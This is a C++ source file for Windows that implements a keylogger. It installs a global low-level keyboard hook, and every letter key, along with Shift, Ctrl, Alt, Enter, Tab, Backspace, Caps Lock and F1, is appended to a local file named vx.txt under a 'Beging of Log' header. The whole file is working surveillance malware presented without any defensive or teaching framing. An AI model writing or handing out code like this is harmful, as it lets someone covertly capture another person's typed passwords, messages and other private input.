#include <Windows.h>
#include <iostream>

HHOOK _hook;

KBDLLHOOKSTRUCT _kbdStruct;


LRESULT __stdcall HookCallback(int nCode, WPARAM wparam, LPARAM lparam)
{
	//Displays the keyboard data returned
	if (nCode >= 0)
	{
		if (wparam == WM_KEYDOWN)
		{
			_kbdStruct = *((KBDLLHOOKSTRUCT*)lparam);
			if (_kbdStruct.vkCode == VK_F1)
			{
				FILE *file;
				fopen_s(&file,"vx.txt", "a+");
				fprintf_s(file, "%s", "F1");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_TAB)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "	");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_BACK)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "Backspace");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_RETURN)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "\n");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_SHIFT)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "SHIFT");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_CONTROL)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "Ctrl");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_MENU)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "Alt");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == VK_CAPITAL)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", " Caps Lock");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 65)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "a");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 66)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "b");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 67)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "c");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 68)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "d");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 69)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "e");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 70)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "f");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 71)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "g");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 72)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "h");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 73)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "i");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 74)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "j");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 75)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "k");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 76)
			{
				FILE *file; 
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "l");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 77)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "m");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 78)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "n");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 79)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "o");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 80)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "p");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 81)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "q");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 82)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "r");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 83)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "s");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 84)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "t");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 85)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "u");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 86)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "v");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 87)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "w");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 88)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "x");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 89)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "y");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 90)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "z");
				
				fclose(file);
			}
			if (_kbdStruct.vkCode == 95)
			{
				FILE *file;
				fopen_s(&file, "vx.txt", "a+");
				fprintf_s(file, "%s", "_ ");
				
				fclose(file);
			}
		}
	}
	return CallNextHookEx(_hook, nCode, wparam, lparam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to load hook!", "Hooking Failed", MB_ICONERROR);
	}
}

void RemoveHook()
{
	UnhookWindowsHookEx(_hook);
}

void main()
{
	FILE *file;
	fopen_s(&file, "vx.txt", "a+");
	fprintf_s(file, "%s", "Beging of Log \n");
	
	fclose(file);

	SetHook();

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0))
	{
		
		Sleep(500);
	}
}